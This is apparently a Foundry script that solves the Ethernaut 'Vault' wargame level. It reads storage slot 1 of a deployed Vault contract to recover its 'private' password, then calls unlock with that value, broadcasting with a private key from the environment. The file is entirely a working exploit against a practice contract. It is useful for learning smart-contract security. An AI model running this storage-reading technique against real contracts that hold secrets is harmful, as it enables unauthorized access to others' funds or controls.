// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {Vault} from "ethernaut/vault.sol";
import "forge-std/console.sol";

contract VaultHackScript is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address vaultIns = address(0xB377f923c47a403FA6E7522C2E82791f74056006);
        bytes32 password = vm.load(vaultIns, bytes32(uint256(1)));
        vaultIns.call(abi.encodeWithSignature("unlock(bytes32)", password));

        vm.stopBroadcast();
    }
}
